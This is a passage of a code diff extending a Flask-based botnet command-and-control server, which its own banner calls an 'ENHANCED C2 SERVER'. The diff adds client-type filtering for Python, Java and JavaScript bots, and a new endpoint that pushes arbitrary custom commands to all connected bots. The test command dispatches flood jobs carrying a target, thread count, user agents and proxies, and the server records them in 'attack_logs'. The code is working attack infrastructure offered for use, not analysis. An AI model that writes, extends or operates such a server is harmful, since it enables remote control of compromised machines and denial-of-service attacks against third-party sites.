+        return jsonify({'status': 'success', 'message': f'Stop command sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
     except Exception as e:
         error_msg = f'Error in send_stop_all: {str(e)}'
         log_activity(error_msg, 'error')
@@ -1425,15 +1710,16 @@ def send_stop_all():
 
 @app.route('/api/command/test', methods=['POST'])
 def send_test_command():
-    """Send test command to all bots"""
+    """Send test command to bots"""
     try:
         data = request.json
         
         target = data.get('target', 'https://httpbin.org/get')
         duration = int(data.get('duration', 10))
         threads = int(data.get('threads', 20))
+        client_type_filter = data.get('client_type', 'all')
         
-        target_bots = filter_bots_by_client_type('all')
+        target_bots = filter_bots_by_client_type(client_type_filter)
         
         if not target_bots:
             return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
@@ -1448,7 +1734,7 @@ def send_test_command():
                     'duration': duration,
                     'threads': threads,
                     'method': 'GET',
-                    'user_agents': user_agents[:2],  # Only first 2 for testing
+                    'user_agents': user_agents[:2],
                     'proxies': []
                 }
                 
@@ -1457,11 +1743,48 @@ def send_test_command():
                 commands_queue[bot_id].append(command)
                 sent_count += 1
         
-        log_activity(f'Test command sent to {sent_count} bots -> {target}', 'info')
-        print(f"[+] Test command sent to {sent_count} bots")
-        return jsonify({'status': 'success', 'message': f'Test command sent to {sent_count} bots'})
+        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
+        log_activity(f'Test command sent to {sent_count} {client_type_display} -> {target}', 'info')
+        print(f"[+] Test command sent to {sent_count} {client_type_display}")
+        return jsonify({'status': 'success', 'message': f'Test command sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
     except Exception as e:
         error_msg = f'Error in send_test_command: {str(e)}'
+        log_activity(error_msg, 'error')
+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/command/custom', methods=['POST'])
+def send_custom_command():
+    """Send custom command to bots"""
+    try:
+        data = request.json
+        
+        command = data.get('command')
+        client_type_filter = data.get('client_type', 'all')
+        
+        if not command:
+            return jsonify({'status': 'error', 'message': 'No command specified'}), 400
+        
+        target_bots = filter_bots_by_client_type(client_type_filter)
+        
+        if not target_bots:
+            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
+        
+        sent_count = 0
+        
+        with queue_lock:
+            for bot_id in target_bots:
+                if bot_id not in commands_queue:
+                    commands_queue[bot_id] = []
+                commands_queue[bot_id].append(command)
+                sent_count += 1
+        
+        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
+        log_activity(f'Custom command sent to {sent_count} {client_type_display}', 'info')
+        print(f"[+] Custom command sent to {sent_count} {client_type_display}")
+        return jsonify({'status': 'success', 'message': f'Custom command sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
+    except Exception as e:
+        error_msg = f'Error in send_custom_command: {str(e)}'
         log_activity(error_msg, 'error')
         print(f"[!] {error_msg}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
@@ -1485,8 +1808,8 @@ def export_logs():
     """Export logs as text file"""
     try:
         with log_lock:
-            log_text = "C2 SERVER LOGS\n"
-            log_text += "=" * 50 + "\n\n"
+            log_text = "C2 SERVER LOGS - MULTI-CLIENT SUPPORT\n"
+            log_text += "=" * 60 + "\n\n"
             for log in attack_logs:
                 client_type = log.get('client_type', '')
                 client_info = f" [{client_type.upper()}]" if client_type else ""
@@ -1503,13 +1826,17 @@ def cleanup():
     print("\n[!] Server shutting down...")
     print(f"[+] Total bots connected: {len(approved_bots)}")
     print(f"[+] Total logs recorded: {len(attack_logs)}")
+    print(f"[+] Client breakdown:")
+    print(f"    Python: {sum(1 for b in approved_bots.values() if b.get('client_type') == 'python')}")
+    print(f"    Java: {sum(1 for b in approved_bots.values() if b.get('client_type') == 'java')}")
+    print(f"    JavaScript: {sum(1 for b in approved_bots.values() if b.get('client_type') == 'javascript')}")
     print("[+] Goodbye!")
 
 if __name__ == '__main__':
     import sys
     
     print("\n" + "="*60)
-    print("  ENHANCED C2 SERVER - JAVA & PYTHON COMPATIBLE")
+    print("  ENHANCED C2 SERVER - MULTI-CLIENT SUPPORT")
     print("="*60)
     
     port = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
@@ -1518,7 +1845,7 @@ if __name__ == '__main__':
     print(f"[+] Starting server on port {port}")
     print(f"[+] Dashboard: http://0.0.0.0:{port}")
     print(f"[+] All bots will be auto-approved")
-    print(f"[+] Java client support: ENABLED")
+    print(f"[+] Client support: Python, Java, JavaScript")
     print(f"[+] Thread configuration: Server-defined -> Sent to clients")
     print(f"[+] User agents: {len(user_agents)} loaded")
     print(f"[+] Waiting for connections...\n")
@@ -1527,4 +1854,3 @@ if __name__ == '__main__':
     atexit.register(cleanup)
     
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
-
